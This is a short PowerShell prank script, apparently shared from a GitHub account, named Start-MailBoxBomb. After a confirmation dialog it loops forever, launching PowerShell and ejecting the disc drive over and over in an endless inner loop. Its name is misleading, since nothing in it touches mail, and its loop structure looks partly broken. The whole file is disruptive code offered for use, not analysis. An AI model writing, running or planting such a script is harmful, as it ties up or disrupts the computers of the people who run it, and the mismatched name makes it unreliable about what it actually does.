function Start-MailBoxBomb
{
#.AUTHOR https://raw.githubusercontent.com/Hackstur
    $result = [System.Windows.Forms.MessageBox]::Show('This is potentially EXTREMELY dangerous to run. Are you sure?' , "WARNING!" , 4)
    
    if ($result -eq 'Yes') 
    {
        While (1) 
        { 
            powershell 
            $Diskmaster = New-Object -ComObject IMAPI2.MsftDiscMaster2 
            $DiskRecorder = New-Object -ComObject IMAPI2.MsftDiscRecorder2 
            $DiskRecorder.InitializeDiscRecorder($DiskMaster) 
            while (1) 
            {
                $DiskRecorder.EjectMedia() 
            }
        }     
    }
}